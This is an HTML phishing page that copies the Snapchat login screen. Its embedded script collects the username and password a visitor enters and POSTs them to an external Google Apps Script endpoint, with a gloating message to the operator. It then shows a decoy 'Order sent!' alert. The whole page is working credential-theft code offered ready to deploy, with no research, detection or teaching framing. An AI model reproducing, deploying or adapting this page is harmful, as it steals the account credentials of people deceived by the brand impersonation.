<!DOCTYPE html>
<html lang="en-us" data-theme="dark">
<head>
<meta charset="utf-8">
<title>Log In â€¢ Snapchat</title>
<meta name="referrer" content="origin">
<meta name="apple-mobile-web-app-capable" content="no">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
<link rel="shortcut icon" href="favicon.png" type="image/png">
<style>
/* Your existing styles (trimmed for brevity) */
*,:after,:before{box-sizing:border-box}body{margin:0;font-family:"Avenir Next","Helvetica Neue",Helvetica,Arial,sans-serif}input,button{font-family:inherit}/* Add any other styles you had */
</style>
</head>
<body class="designV2">
  <div class="pusher">
    <div id="login-root">
      <div class="App">
        <div class="full-background-color"></div>
        <div class="Header">
          <a href="#" class="logo sf-hidden"></a>
        </div>

        <div class="Login">
          <article class="page">
            <div class="container">
              <img class="snapchat-icon" src="icon.svg" alt="Snapchat">

              <h1 class="accountsTitle">Log in to Snapchat</h1>

              <form id="loginForm">
                <div class="form-group has-success">
                  <label for="username" class="control-label">username or Email</label>
                  <input name="username" autocomplete="off" type="text" id="username"
                         class="form-control" required>
                </div>

                <div class="form-group has-success">
                  <label for="password" class="control-label">password</label>
                  <input name="password" autocomplete="off" type="number" id="password"
                         class="form-control" required>
                </div>

                <p class="secondary_action"><a href="#">Forgot password</a></p>

                <div class="primary_action login-button">
                  <button type="button" id="sendbutton" class="btn btn-lg btn-primary">
                      Log In
                  </button>
                </div>
              </form>

              <div class="create-account-cta">
                <span>New To Snapchat?</span>
                <a href="#">Sign Up</a>
              </div>
            </div>
          </article>
        </div>
      </div>
    </div>
  </div>

<script>
document.getElementById("sendbutton").addEventListener("click", function(event) {
    event.preventDefault();

    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();

    if (!username || !password) {
        alert("Please fill in both fields!");
        return;
    }

    const message = `**Ahamed your a genius**\n\n**username:** ${username}\n**password:** ${password}`;
    const scriptUrl = "https://script.google.com/macros/s/AKfycbwZ4Hx5sLNa-3xfwBmLeb2b2dOaSpOJrOT7Ph7WroE0bO4K4e0kt7eFBgHx1eZ-mkeXtA/exec";

    // Disable button to prevent double-click
    const button = document.getElementById("sendbutton");
    button.disabled = true;

    fetch(scriptUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: message })
    })
    .then(response => response.text()) // safer than .json()
    .then(data => {
        alert("Order sent!");
        document.getElementById("username").value = "";
        document.getElementById("password").value = "";
    })
    .catch(error => {
        alert("Error sending order: " + error);
    })
    .finally(() => {
        button.disabled = false;
    });
});
</script>
</body>
</html>
